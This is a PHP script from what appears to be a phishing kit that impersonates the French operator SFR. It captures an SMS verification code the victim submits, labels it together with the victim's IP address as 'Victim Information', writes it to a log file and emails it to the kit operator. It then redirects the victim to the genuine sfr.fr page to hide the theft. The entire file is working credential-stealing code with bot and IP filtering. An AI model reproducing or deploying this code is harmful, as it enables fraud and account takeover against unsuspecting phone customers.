<?php
$bin4=$_GET['page'];
error_reporting(0);
include ('bots.php');
include ('banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");
include 'rm.php';
$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . "";
$to = $Your_Email;$from = "sfr@online.de";$headers = "From:" . $from;$subj = "SMS OK : $ip";
if(!isset($_REQUEST['shipped']) || $_REQUEST['shipped']=='' ){
	die("<script type='text/javascript'>top.location ='index.php?page=****';</script>");
}

$smes = $_REQUEST['shipped'];


if(strlen($smes) < 4)
{
    die("<script type='text/javascript'>top.location ='index.php?page=****';</script>");

}else{
		
        $data = "
+ --------- $subj ---------+
+ OK SMS : $smes
+ -------------------------------------------------------------+
+ -------------------------------------------------------------+
+ Victim Information
 $VictimInfo
+ -------------------------------------------------------------+
";
if($Save_Log==0) { $file = fopen("../../nd7/Full.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) { mail($to,$subj,$data,$headers); }
die("<script type='text/javascript'>top.location = 'https://www.sfr.fr/#sfrintid=HH_Logo';</script>");}

?>